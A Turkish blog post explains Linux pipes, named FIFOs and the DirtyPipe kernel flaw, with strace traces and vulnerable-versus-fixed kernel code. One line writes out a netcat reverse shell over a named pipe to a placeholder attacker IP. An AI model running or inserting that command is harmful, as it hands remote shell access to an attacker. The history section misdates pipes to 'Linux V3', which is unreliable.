Title: Linux/Unix sistemlerde Borular ve DirtyPipe
Date: 2023-10-11 22:00
Tags: linux pipes, linux borular, pipe nedir, linux pipes türkçe, işletim sistemi borular, işletim sistemlerinde borular, işletim sistemlerinde pipelar, pipe ne demek, dirtypipe, anonymous pipe, isimsiz pipe, isimli pipe, isimsiz borular, isimli borular, named pipes
Category: linux
Authors: 0x656e

# Linux/Unix sistemlerde Borular ve DirtyPipe

> Öncelikle yazıya boruların orjinal isminin “**PIPE**” olduğuyla giriş yapmak istiyorum. Çalışma yapısı itibariyle boru gibi olduğu için borular şeklinde bahsedeceğim ama siz yine de PIPE diye bilin. Biliyorsunuz ki Türkçe teknik kitaplarda İngilizce teknik terimlerin direkt çevirisi dolayısıyla bolca sıkıntı yaşıyoruz.


## Girizgah

Bir önceki post olan [Windows Sistemlerde Borular (PIPE)]([https://enesergun.net/windows-sistemlerde-borularpipe.html](https://enesergun.net/windows-sistemlerde-borularpipe.html)) yazısında işletim sistemleri arası iletişim serisi şeklinde blog konularından gideceğimi yazmıştım. Bakmayın ben de öğrenip, araştırıp yazıyorum. Bildiğime değil yani. Her neyse bu blog yazısındaki konumuz da bir önceki ile benzer olarak Linux sistemlerde Borular şeklinde olacak.

## Neymiş bu borular?

Linux’a ucundan köşesinden dokunmuş herkes en azından aşağıdaki komutu yazmıştır.

```cpp
cat foo.txt | grep "bar"
```

İlgili komut **cat** komutuna verilen ilk argüman olan dosyayı okuyup daha sonra **PIPE’layarak** dan sonraki process’e iletiyor. İkinci kısımdaki uygulama olan **grep** de bu outputu alarak işliyor ve çıktısını ekrana veriyor. Tabi bütün bu işlemler memory üzerinde gerçekleşiyor. Burada FIFO (First-in First-out) olarak çalıştığını belirtmekte yarar var. Fakat FIFO için aşağıda ayrı bir başlık açacağız inş. Borulara çalışma seviyesi açısından bakarsak da **user land > kernel land > user land** şeklinde bir akış çizebiliriz. User land ile kernel land adres alanları kullanılıyor. Burası **çokomelli**. 

Yukarıdaki örnek sh komutu için: “Abi grep ile cat’i aynı anda niye kullanıyorsun fazladan process çalıştırıyorsun diyenlerin ağzına kürekle vururum.” Neyse, kısaca özetlersek:

cat ile standart input(**stdin**)’tan okunan veri standart output(**stdout**) ile pipelanarak grep komutunun standart input’una veriyi gönderiyor. Bir de tabi bunun standart error (stderr) kısmı var.

Linux üzerindeki **File Descriptorlara** kısaca göz atarsak, şimdilik bu kadarı yeterli olacaktır diye düşünüyorum:

- stdin = fd 0
- stdout = fd 1
- stderr = fd 2

Tıpkı Windowsda olduğu gibi Linux sistemlerde de borular ikiye ayrılıyor. Bu ayrım yine aynı şekilde:

- Anonymous Pipes
- Named Pipes

Diğer sistemlerden farklı olarak Linux sistemlerde önemli bir fark bulunuyor. Bu fark linux üzerinde boruların bufferlanarak kullanılmasından kaynaklanmaktadır. Buffer boyutu olarak da Wikipedia’da yazana göre 64KiB olarak belirtilmekte fakat aslında sistem bazında page size’a göre belirleniyor. Linux 2.6.11’den beri 16 page size’a eşit olarak geldiği belirtiliyor. Pek tabii farklı 3rd party filtre kullanarak bu boru boyutu artırılabiliyor. Bufferlama özelliği için aşağıdaki halk ağzıyla olan girdi basitleştirmek için kullanılabilir sanırım:

> İlk process’in çıktısı buffer’ı doldurarak ikinci process’i besler eğer buffer boşalmamışsa yani ikinci process veriyi alıp bufferı silmediyse ilk process durur(blocking) ve bekler.
> 

Boruların Byte Stream olarak kullanılıyor olduğunu biliyoruz fakat man sayfasına baktığımızda aslında **Linux 3.4’den** beri **O_DIRECT** flagi ile birlikte packet modunda da pipe oluşturabildiğimizi görebiliriz. Burası önemli bir nokta. Diğer değinmemiz gereken flag ise **O_NONBLOCK** flagidir. İlgili flag ile de borunun blocking moduna karar verebiliyoruz.

## Şimdi Daha Derine

Yukarıda Linux üzerinde 2 tür boru olduğundan bahsetmiştik. Genel anlamda biz boruları kullanırken **********“|”********** işaretini kullansak da İsimli borular için FIFOs terimi kullanılıyor. 

### İsimsiz borular

Aslında yazının bu kısmına kadar genel anlamda “Anonymous Pipes” dan bahsettik ama ayırmamız gerekiyor. 

Linux üzerindeki implementasyona baktığımızda “pipe()” (**Not: pipe() ve pipe2() ile birlikte**) sistem çağrısıyla boru oluşturabiliyoruz. İlgili sistem çağrısı ise do_pipe fonksiyonunu çalıştırıyor ve geri dönüş olarak bize 2 adet file descriptor dönüyor. 

[https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c](https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L1010)

```cpp
SYSCALL_DEFINE2(pipe2, int __user *, fildes, int, flags)
{
	return do_pipe2(fildes, flags);
}

SYSCALL_DEFINE1(pipe, int __user *, fildes)
{
	return do_pipe2(fildes, 0);
}
```

```cpp
static int do_pipe2(int __user *fildes, int flags)
{
	struct file *files[2];
	int fd[2];
	int error;

	error = __do_pipe_flags(fd, files, flags);
	if (!error) {
		if (unlikely(copy_to_user(fildes, fd, sizeof(fd)))) {
			fput(files[0]);
			fput(files[1]);
			put_unused_fd(fd[0]);
			put_unused_fd(fd[1]);
			error = -EFAULT;
		} else {
			fd_install(fd[0], files[0]);
			fd_install(fd[1], files[1]);
		}
	}
	return error;
}
```

Default olarak boruların max boyutu için: 

```cpp
cat /proc/sys/fs/pipe-max-size
$> 1048576
```

Bir pipe oluşturduğumuzda yapılan çağrıları takip etmek için strace kullanalım ve bazı sistem çağrılarını takip edelim. Bunlar: execve, pipe, write ve read çağrıları.

Komut:

```cpp
strace -qf -e execve,pipe,write,read \
sh -c 'cat temp.txt | wc -c'
```

Output:

```cpp
execve("/usr/bin/sh", ["sh", "-c", "cat temp.txt | wc -c"], 0xffffd2c6a6d8 /* 55 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0py\2\0\0\0\0\0"..., 832) = 832
[pid 517067] execve("/usr/bin/cat", ["cat", "temp.txt"], 0xaaaad55eaef8 /* 55 vars */) = 0
[pid 517067] read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0py\2\0\0\0\0\0"..., 832) = 832
[pid 517068] execve("/usr/bin/wc", ["wc", "-c"], 0xaaaad55eaf28 /* 55 vars */) = 0
**[pid 517067] read(3, "imam hatipler kapatilsin\n", 131072) = 25**
[pid 517068] read(3,  <unfinished ...>
**[pid 517067] write(1, "imam hatipler kapatilsin\n", 25 <unfinished ...>**
[pid 517068] <... read resumed>"\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0py\2\0\0\0\0\0"..., 832) = 832
[pid 517067] <... write resumed>)       = 25
[pid 517067] read(3, "", 131072)        = 0
[pid 517067] +++ exited with 0 +++
[pid 517066] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=517067, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
[pid 517068] read(3, "# Locale name alias data base.\n#"..., 4096) = 2996
[pid 517068] read(3, "", 4096)          = 0
**[pid 517068] read(0, "imam hatipler kapatilsin\n", 16384) = 25**
[pid 517068] read(0, "", 16384)         = 0
[pid 517068] write(1, "25\n", 325
)        = 3
[pid 517068] +++ exited with 0 +++
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=517068, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+++ exited with 0 +++
```

İlgili çıktıda dikkat ederseniz PID numarası +1 olarak iki ayrı process olarak geliyor. Bunun sebebi biz ilgili komutu gerçekleştirdiğimizde aslında uygulamalar üzerinde boruların doğası gereği bir değişim yapmıyoruz. İlgili programlar normal bir süreçmiş gibi stdin ve stdout’larını alıyorlar. Burada magic olan kısım direkt olarak borular oluyor. 2 process’in normal şartlarda birbirinden haberi yok. Fakat; eğer biraz [pwn.college](http://pwn.college) çözmüşseniz orada görmüş olacağınız gibi processlerin çalışma mantığından dolayı bizi değer ileten programı child-parent process( çünkü fork 🙂 ) ilişkisi içerisinde görebilir ve kontrol edebilirsiniz.  

## İsimli Borular / Named Pipes

Linux üzerinde isimli boruların, isimsiz borulardan çok da bir farkı yok aslında ama… Bu zat-ı muhteremlerin en büyük farkı kendilerinin aslında bir persistency (kalıcılık) sunması. İsimsiz borularda her şey iki process arasında memory ile paylaşılırken burada bir virtual file system üzerinden okunup, yazılıyor. Doğal olarak siz bir isimli boru oluşturduğunuzda diğer sessionlarınız ile de ilgili boru üzerinde işlem yapabiliyorsunuz. Bu da bize büyük bir esneklik sağlıyor. 

Her neyse… Linux üzerinde isimli boru oluşturmak için 2 adet komutumuz bulunuyor. Bunlar:

1. mknod
2. mkfifo

Örnek olarak ebucehil adında bir pipe oluşturdum. Ben artık istediğim process veya session ile buraya yazabilir ve buradan okuyabilirim.

```cpp
┌──(root㉿kali)-[~]
└─# mkfifo /tmp/ebucehil

┌──(root㉿kali)-[~]
└─# ls -la /tmp/ebucehil 
prw-r--r-- 1 root root 0 Oct  8 20:18 /tmp/ebucehil
```

Yazma veya okuma işlemi için linux üzerindeki çıktı yönlendirmeyi kullanabilirsiniz. **Not: Kullanıcılara dikkat edin.** 

Yazma:

```cpp
┌──(root㉿kali)-[/home/ka1]
└─# cat temp.txt > /tmp/ebucehil
```

Okuma:

```cpp
┌──(ka1㉿kali)-[~]
└─$ tail -f /tmp/ebucehil 
imam hatipler kapatilsin
```

Dikkat

```cpp
┌──(ka1㉿kali)-[~]
└─$ cat temp.txt > /tmp/ebucehil
zsh: permission denied: /tmp/ebucehil
```

Ayrıca 2. bir dikkat etmemiz gereken şey ise tıpkı isimsiz pipeler gibi (neden belirtme gereği duyuyorum bilmiyorum ama, yani sonuçta pipe isimli de olsa isimsiz de olsa pipedır.) eğer okuma yapmazsanız üzerine 2. bir veriyi yazamazsınız. Bu sebeple çift yönlü bir işlem yapmanız gerekir. Yok öyle abi her şeyi buraya atayım sonra okuyayım. Zaten öyle bir isteğiniz varsa pipe kullanmanıza gerek yok gidin dosya kullanın. 

Şimdi bir de isimli boruları kullanırken yaptığımız yönlendirme işlemindeki kullanılan sistem çağrılarına bakalım:

```cpp
trace -c -f sh cat temp.txt > /tmp/ebucehil
sh: 0: cannot open cat: No such file
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
  0.00    0.000000           0         1         1 faccessat
  0.00    0.000000           0         3         1 openat
  0.00    0.000000           0         2           close
  0.00    0.000000           0         1           read
  0.00    0.000000           0         3           write
  0.00    0.000000           0         4           newfstatat
  0.00    0.000000           0         1           set_tid_address
  0.00    0.000000           0         1           set_robust_list
  0.00    0.000000           0         1           rt_sigaction
  0.00    0.000000           0         1           getpid
  0.00    0.000000           0         1           getppid
  0.00    0.000000           0         1           getuid
  0.00    0.000000           0         1           geteuid
  0.00    0.000000           0         1           getgid
  0.00    0.000000           0         3           brk
  0.00    0.000000           0         3           munmap
  0.00    0.000000           0         1           execve
  0.00    0.000000           0         6           mmap
  0.00    0.000000           0         4           mprotect
  0.00    0.000000           0         1           prlimit64
  0.00    0.000000           0         1           getrandom
  0.00    0.000000           0         1           rseq
------ ----------- ----------- --------- --------- ----------------
100.00    0.000000           0        42         2 total
```

Normal strace çıktısına bakalım:

```cpp
┌──(root㉿kali)-[/home/ka1]
└─# strace -qf -e execve,pipe,write,read \
sh -c 'cat temp.txt > /tmp/ebucehil'
execve("/usr/bin/sh", ["sh", "-c", "cat temp.txt > /tmp/ebucehil"], 0xffffd50935b8 /* 32 vars */) = 0
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0py\2\0\0\0\0\0"..., 832) = 832
[pid 530925] execve("/usr/bin/cat", ["cat", "temp.txt"], 0xaaaacda2fa88 /* 32 vars */) = 0
[pid 530925] read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0py\2\0\0\0\0\0"..., 832) = 832
[pid 530925] read(3, "imam hatipler kapatilsin\n", 131072) = 25
[pid 530925] write(1, "imam hatipler kapatilsin\n", 25) = 25
[pid 530925] read(3, "", 131072)        = 0
[pid 530925] +++ exited with 0 +++
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=530925, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+++ exited with 0 +++
```

Yapılan sistem çağrılarına baktığımızda (en azından filtrelediklerimize) isimli boruların daha cimri olduğunu görebiliriz. 

DirtyPipe açığına geçmeden önce offensive kullanım örneği vermek amacıyla isimli borularla ilgili dokunmak istediğim bir şey var. Mknod/Mkfifo kullanarak reverse shell oluşturabileceğinizi ve kullanabileceğiniz biliyor muydunuz?

```cpp
mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
```

2-3 belki daha önce(telegram historyden baktım 2017’ymiş) ilgili komutu gördüğümde gerçekten mindfuck geçirmiştim fakat şimdi pipeları biraz da olsun öğrendiğim için neden olmasın ki diyebiliyorum. 

Daha detaylı bilgi için:

[https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99](https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99)

## DirtyPipe

Direkt detaylı bilgi: [https://dirtypipe.cm4all.com/](https://dirtypipe.cm4all.com/)

Kısaca: 2006 yılında Linux üzerinde splice diye bir sistem çağrısı entegre edilmiş. İlgili sistem çağrısı borular arasındaki iletişimde tüm datanın kernel’a gidip tekrardan userland’e geri dönmemesi için verimlilik adına kullanılmak amacıyla ortaya çıkmış tabi. Bunu da borular arasındaki buffera alınan veriler içerisine “******PIPE_BUF_FLAG_CAN_MERGE******” bayrağı ile sağlamışlar. Buraya kadar her şey düzgün giderken buffer’a eklenen her veri içerisine bu değer işlenmiş fakat ilgili refactoring düzgün işletilmediği veya kaçırıldığı için ilgili bayrak, splice operasyonu sırasında initialize edilmediği için saldırgan kişiler initialize sırasında istediği değerleri read-only buffer içerisine yazabilmişler. Sonrası malum zaten.

Kısacasından ziyade açıklamaya girersek eğer:

Borularda yazma işlemini gerçekleştiren **pipe_write()** fonksiyonu gerçekleştiriyor. Eğer boru boş değilse son buffer içerisindeki veri ile şu an ki veriyi birleştirmekle yükümlü. Bunu da pek tabi bayrak ile yapıyor. Bunu yaparken de verileri farklı bufferlarda tutabilmek için aslında 2 adet dallanma gerçekleştiriyor. Yazma işlemi yapacağı zaman yeni oluşturulan buffer’ı **“PIPE_BUF_FLAG_CAN_MERGE”** olarak işaretliyor ki gelen veriler birleştirilebilsin. Veri akışı bitene kadar da bu bayrak kullanılıyor.  Yeni oluşturulan buffer da doğal olarak memory table’da belirli bir allocation işlemi gerçekleştiriyor. 

```cpp
buf = &pipe->bufs[head & mask]; 
buf->page = page;
buf->ops = &anon_pipe_buf_ops;
buf->offset = 0;
buf->len = 0;
 if (is_packetized(filp))
  buf->flags = PIPE_BUF_FLAG_PACKET;
 else
   buf->flags = PIPE_BUF_FLAG_CAN_MERGE; 
 pipe->tmp_page = NULL; 
 **copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);**
```

```cpp
if (!buf->len) {
				pipe_buf_release(pipe, buf);
				spin_lock_irq(&pipe->rd_wait.lock);
				tail++;
				pipe->tail = tail;
				spin_unlock_irq(&pipe->rd_wait.lock);
			}
			total_len -= chars;
			if (!total_len)
				break;	/* common path: read succeeded */
			if (!pipe_empty(head, tail))	/* More to do? */
				continue;
```

copy_page_from_iter: 

```cpp
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	struct pipe_inode_info *pipe = i->pipe;
	struct pipe_buffer *buf;
	unsigned int p_tail = pipe->tail;
	unsigned int p_mask = pipe->ring_size - 1;
	unsigned int i_head = i->head;
	size_t off;

	if (unlikely(bytes > i->count))
		bytes = i->count;

	if (unlikely(!bytes))
		return 0;

	if (!sanity(i))
		return 0;

	off = i->iov_offset;
	buf = &pipe->bufs[i_head & p_mask];
	if (off) {
		if (offset == off && buf->page == page) {
			/* merge with the last one */
			buf->len += bytes;
			i->iov_offset += bytes;
			goto out;
		}
		i_head++;
		buf = &pipe->bufs[i_head & p_mask];
	}
	if (pipe_full(i_head, p_tail, pipe->max_usage))
		return 0;

	buf->ops = &page_cache_pipe_buf_ops;
	get_page(page);
	buf->page = page;
	buf->offset = offset;
	buf->len = bytes;

	pipe->head = i_head + 1;
	i->iov_offset = offset + bytes;
	i->head = i_head;
out:
	i->count -= bytes;
	return bytes;
}
```

Yukarıda buffer yapısı içerisinde flag’in doğru düzgün biçimde initialize edilmediğini görmekteyiz. Dananın kuyruğu da burada kopuyor işte. Burada yukarıda bahsettiğimiz gibi verimlilik için okuma işlemi splice ile yapılıyor ve ilgili sistem çağrısı da veriyi(byteları) almak yerine aslında o veriyi tutan memory page’ini değer olarak alıyor. bknz: call by reference. Tabi bu kısımda ayrıca Copy on write’a da değinmek gerekiyor ama böyle gidersek işin içinden bu yazı içerisinde çıkamayız. Orada da DirtyCow’u açıklamak elzem olur. Bu konuda Türkçe yazı var mı bilmiyorum araştırabilirsiniz diye düşünüyorum. Bana sevgili Emrah kardeşim anlattığı için ayrıca teşekkür ederim. Her neyse devam edelim.

İşlem boyunca flagin initialize(ilk değer verme?) edilmediğini söylemiştik. Bu sebeple biz boruyu daha doğrusu bufferdaki tüm verileri ilgili FLAG ile doldurup boşaltabiliriz. Bu boşaltmadan sonra ise biz tüm bufferdaki verilere “**PIPE_BUF_FLAG_CAN_MERGE”** bayrağını işaretlediğimiz için küçük bir alana(1 baytcık) yazabiliriz. İlgili işlemlerin kernel üzerinde gerçekleştirildiğini unutmayalım. Herhangi bir denetime tabi değil bu aşamada. Bu sebeple de istediğimiz dosyaya (read only) yazıp root olabiliriz. 

Exploit kodunu incelemek için:

[https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c#L143](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c#L143)

Aslında patchten sonra ve öncesi için de bir kod bloğu eklemem gerek sanırım bu sebeple aşağıya fixlenmemiş ve fixlenmiş kaynak kodunu ekliyorum. 

Vulnerable:

```c
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	struct pipe_inode_info *pipe = i->pipe;
	struct pipe_buffer *buf;
	unsigned int p_tail = pipe->tail;
	unsigned int p_mask = pipe->ring_size - 1;
	unsigned int i_head = i->head;
	size_t off;

	if (unlikely(bytes > i->count))
		bytes = i->count;

	if (unlikely(!bytes))
		return 0;

	if (!sanity(i))
		return 0;

	off = i->iov_offset;
	buf = &pipe->bufs[i_head & p_mask];
	if (off) {
		if (offset == off && buf->page == page) {
			
			buf->len += bytes;
			i->iov_offset += bytes;
			goto out;
		}
		i_head++;
		buf = &pipe->bufs[i_head & p_mask];
	}
	if (pipe_full(i_head, p_tail, pipe->max_usage))
		return 0;

	buf->ops = &page_cache_pipe_buf_ops; // Bu kısıma dikkat edin. 
	get_page(page); // 
	buf->page = page; //
	buf->offset = offset; //
	buf->len = bytes; //

	pipe->head = i_head + 1;
	i->iov_offset = offset + bytes;
	i->head = i_head;
out:
	i->count -= bytes;
	return bytes;
}
```

[https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/lib/iov_iter.c#L367](https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/lib/iov_iter.c#L367)

Fixlenmiş hali:

```c
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	struct pipe_inode_info *pipe = i->pipe;
	struct pipe_buffer *buf;
	size_t off;
	int idx;

	if (unlikely(bytes > i->count))
		bytes = i->count;

	if (unlikely(!bytes))
		return 0;

	if (!sanity(i))
		return 0;

	off = i->iov_offset;
	idx = i->idx;
	buf = &pipe->bufs[idx];
	if (off) {
		if (offset == off && buf->page == page) {
			/* merge with the last one */
			buf->len += bytes;
			i->iov_offset += bytes;
			goto out;
		}
		idx = next_idx(idx, pipe);
		buf = &pipe->bufs[idx];
	}
	if (idx == pipe->curbuf && pipe->nrbufs)
		return 0;
	pipe->nrbufs++;
	buf->ops = &page_cache_pipe_buf_ops; //
	buf->flags = 0; // Burada tekrar initialize ediliyor.
	get_page(buf->page = page);
	buf->offset = offset; // 
	buf->len = bytes; //
	i->iov_offset = offset + bytes;
	i->idx = idx;
out:
	i->count -= bytes;
	return bytes;
}
```

[https://github.com/engstk/op6/blob/609e7a1d9e752235ba8e8f21dff67e4ddefa14dd/lib/iov_iter.c#L339](https://github.com/engstk/op6/blob/609e7a1d9e752235ba8e8f21dff67e4ddefa14dd/lib/iov_iter.c#L339)

Android tarafındaki fix de aynı şekilde geçiyor. 

[https://android.googlesource.com/kernel/common/+/aa3e9c7480830f38390a61501386be4a03efb88d/lib/iov_iter.c](https://android.googlesource.com/kernel/common/+/aa3e9c7480830f38390a61501386be4a03efb88d/lib/iov_iter.c)

[https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c](https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c)

## Tarihçesi

Kısaca bahsedersek (direkt wikiden alıyorum).

Konsept ilk olarak “[Douglas McIlroy](https://en.wikipedia.org/wiki/Douglas_McIlroy)” tarafından ortaya atılıyor. 1973 yılında ise fikri Ken Thomson tarafından Linux’a **pipe()** sistem çağrısıyla, Linux V3 ile implemente ediliyor. Douglas Mcllroy abimiz Ken Thomson’a “**|**” notasyonu sebebiyle respect çakmayı da unutmuyor tabi ki. 

 

## Son

Yazının son kısımları sanki boş kağıdı doldurmaya çalışan öğrenci gibi oldu ama gerekli olur diye eklemek istedim. Gözlerinizi bozduysam affola.

Klasik olarak yazı sonu şarkısını ekleyip bu yazıyı sonlandıralım. Bu sefer yine karar veremeyip 2 tane şarkı ekliyorum. Okuduğunuz için teşekkürler:

```c
[![Pera - Sensiz Ben](https://res.cloudinary.com/marcomontalbano/image/upload/v1696975449/video_to_markdown/images/youtube--5wzntE1XNrs-c05b58ac6eb4c4700831b2b3070cd403.jpg)](https://www.youtube.com/watch?v=5wzntE1XNrs "Pera - Sensiz Ben")
```

```c
[![Murat Yılmazyıldırım - Adsız Özlem](https://res.cloudinary.com/marcomontalbano/image/upload/v1696975533/video_to_markdown/images/youtube--N-bj9HpGTOA-c05b58ac6eb4c4700831b2b3070cd403.jpg)](https://www.youtube.com/watch?v=N-bj9HpGTOA "Murat Yılmazyıldırım - Adsız Özlem")
```

## Referanslar

---

1. [https://en.wikipedia.org/wiki/Pipeline_(Unix)](https://en.wikipedia.org/wiki/Pipeline_(Unix))
2. [https://tldp.org/LDP/lpg/node10.html](https://tldp.org/LDP/lpg/node10.html)
3. [https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/](https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/)
4. [https://dirtypipe.cm4all.com/](https://dirtypipe.cm4all.com/)
